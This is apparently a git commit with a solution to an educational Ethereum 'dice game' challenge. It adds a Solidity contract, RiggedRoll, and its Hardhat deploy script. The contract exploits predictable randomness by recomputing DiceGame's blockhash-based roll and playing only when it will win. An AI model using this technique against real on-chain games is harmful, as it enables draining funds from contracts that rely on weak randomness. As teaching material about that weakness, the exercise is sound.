1580bd85d548853a5b3dff0b1d98f0cbb02a7669
Joseph Chustz <joseph@progradesolutions.com>
2022-07-28 08:00:37 -0400

    challenge-3-dice-game

---
+++ challenge-3-dice-game/packages/hardhat/contracts/RiggedRoll.sol
@@ -0,0 +1,39 @@
+pragma solidity >=0.8.0 <0.9.0;
+//SPDX-License-Identifier: MIT
+
+import "hardhat/console.sol";
+import "./DiceGame.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract RiggedRoll is Ownable {
+    DiceGame public diceGame;
+
+    constructor(address payable diceGameAddress) {
+        diceGame = DiceGame(diceGameAddress);
+    }
+
+    //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address payable to, uint256 amount) external onlyOwner {
+        require(address(this).balance >= amount, "Failed to send enough value");
+        to.transfer(amount);
+    }
+
+    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() external {
+        require(
+            address(this).balance >= .002 ether,
+            "Contract doesn't have enough ether to roll"
+        );
+        uint256 nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), nonce)
+        );
+        uint256 roll = uint256(hash) % 16;
+        require(roll <= 2, "Small than 2");
+        diceGame.rollTheDice{value: 0.002 ether}();
+    }
+
+    //Add receive() function so contract can receive Eth
+    receive() external payable {}
+}
---
+++ challenge-3-dice-game/packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -0,0 +1,29 @@
+const { ethers } = require("hardhat");
+
+const localChainId = "31337";
+
+module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
+  const { deploy } = deployments;
+  const { deployer } = await getNamedAccounts();
+  const chainId = await getChainId();
+
+  const diceGame = await ethers.getContract("DiceGame", deployer);
+
+  await deploy("RiggedRoll", {
+    from: deployer,
+    args: [diceGame.address],
+    log: true,
+  });
+
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+
+  const ownershipTransaction = await riggedRoll.transferOwnership(
+    "0x7cd276e01Df1348bA9D0b1C8077Da050997680D1"
+  );
+};
+
+function sleep(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+module.exports.tags = ["RiggedRoll"];
